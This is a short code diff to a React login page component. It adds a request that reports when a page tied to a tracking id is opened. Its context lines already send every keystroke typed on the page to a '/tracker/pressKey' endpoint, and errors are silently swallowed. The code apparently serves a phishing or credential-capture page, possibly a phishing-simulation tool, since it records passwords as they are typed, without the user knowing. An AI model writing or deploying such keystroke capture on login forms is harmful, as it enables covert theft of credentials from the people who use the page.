@@ -8,6 +8,10 @@ export const Login = () => {
     const {id} = useParams()
 
     useEffect(() => {
+        if(!id) return
+
+        axiosInstance.post(`/tracker/open/${id}`).catch(() => {})
+
         function handleKeyDown(e: KeyboardEvent){
             axiosInstance.post(`/tracker/pressKey/${id}`, {key: e.key.toString()}).catch(() => {})
         }
